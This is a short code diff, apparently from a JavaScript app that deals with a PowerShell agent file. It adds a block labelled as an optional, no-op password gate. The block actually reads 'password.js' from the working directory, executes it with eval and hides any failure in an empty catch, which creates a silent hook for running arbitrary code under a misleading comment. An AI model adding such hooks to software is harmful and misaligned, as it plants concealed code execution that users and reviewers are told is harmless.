@@ -1,5 +1,12 @@
 const html = await loadHtml("body.html");
 
+// Password gate (optional, no-op for now).
+try {
+	const __pwSrc = await fs.readFile(util.join(workingDirectory, "password.js"));
+	eval(convert.arrayToText(__pwSrc));
+	if (typeof gate === "function") await gate();
+} catch (e) {}
+
 const APP_ID = "NikN_ArcSD";
 const AGENT_VERSION = "1.0.0";
 const AGENT_FILE = "agent.ps1";
